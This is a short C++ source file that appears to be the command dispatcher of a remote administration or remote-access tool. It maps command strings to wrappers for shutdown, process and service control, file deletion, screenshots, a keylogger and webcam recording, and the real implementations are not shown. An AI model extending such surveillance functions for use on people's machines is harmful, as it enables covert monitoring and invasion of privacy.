#include "services.h"

namespace Services {
    std::map<std::string, bool(*)(const std::string&)> servicesMap {
        {"system-shutdown",     &shutdown}, 
        {"system-restart",      &restart},
        {"application-list",    &listApplications},
        {"application-start",   &startApplication},
        {"application-stop",    &stopApplication},
        {"service-list",        &listServices},
        {"service-start",       &startService},
        {"service-stop",        &stopService},
        {"file-delete",         &deleteFile},
        {"screenshot",          &screenShot},
        {"keylogger",           &keyLogger},
        {"webcam-start",        &webcamRecord}
    };
};

bool Services::shutdown(const std::string &saveFile) {
    return ShutdownComputer();
}
bool Services::restart(const std::string &saveFile) {
    return RestartComputer();
}
bool Services::deleteFile(const std::string &filePath) {
    return DelFile(filePath);
}

bool Services::keyLogger(const std::string &saveFile) {
    return KeyLogger(saveFile);
}

bool Services::listApplications(const std::string &saveFile) {
    return ListApps(saveFile);
}
bool Services::startApplication(const std::string &appName) {
    return StartApp(appName);
}
bool Services::stopApplication(const std::string &appName) {
    return StopApp(appName);
}

bool Services::listServices(const std::string &saveFile) {
    return ListSers(saveFile);
}

bool Services::startService(const std::string &serviceName) {
    return StartSer(serviceName);
}

bool Services::stopService(const std::string &serviceName) {
    return StopSer(serviceName);
}

bool Services::screenShot(const std::string &saveFile) {
    return TakeScreenShot(saveFile);
}
bool Services::webcamRecord(const std::string &fileName) {
    std::wstring filename (fileName.begin(), fileName.end());
    return SUCCEEDED(WebcamCapture(filename.c_str()));
}